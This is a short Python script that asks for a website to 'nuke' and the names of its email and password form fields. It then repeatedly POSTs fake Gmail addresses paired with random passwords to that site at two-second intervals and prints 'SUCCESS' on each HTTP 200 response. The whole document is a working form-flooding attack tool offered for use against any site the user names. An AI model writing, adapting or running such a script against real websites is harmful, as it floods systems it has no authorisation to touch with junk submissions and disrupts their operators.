import requests
import random
import string
import time
import os
count = 1000
word = ["apple", "banana", "cat", "dog", "elephant", "flower", "grass", "hat", "igloo", "juice", "kangaroo", "lion", "moon", "nest", "ocean", "parrot", "queen", "rabbit", "sun", "tree", "umbrella", "van", "watch", "xylophone", "yacht", "zebra", "ant", "butterfly", "crocodile", "dolphin", "eagle", "fish", "giraffe", "horse", "iguana", "jaguar", "koala", "lighthouse", "monkey", "night", "owl", "penguin", "quail", "raccoon", "snake", "tiger", "unicorn", "vulture", "whale", "x-ray", "yak", "zephyr", "air", "book", "car", "drum", "egg", "frog", "guitar", "house", "ice", "jacket", "kite", "lemon", "mouse", "noise", "orange", "pumpkin", "queen", "robot", "sock", "train", "umbrella", "violin", "watch", "x-ray", "yacht", "zipper"]

os.system("clear")
website = input("what Website do you want to nuke: ")
emailfield = input("whats the value name of the email field: ")
passwordfield = input("whats the value name of the password field: ")

url = "{}".format(website)

while count < (10000):
    time.sleep(2)
    gmail = random.choice(word) + random.choice(word) + "@gmail.com"
    password = "".join(random.choice(string.ascii_letters + string.digits) for _
    in range(10))
    data = {
        emailfield: gmail,
        passwordfield: password
    }
    response = requests.post(url, data=data)

    if response.status_code == 200:{
        print("SUCCESS -", data)
    }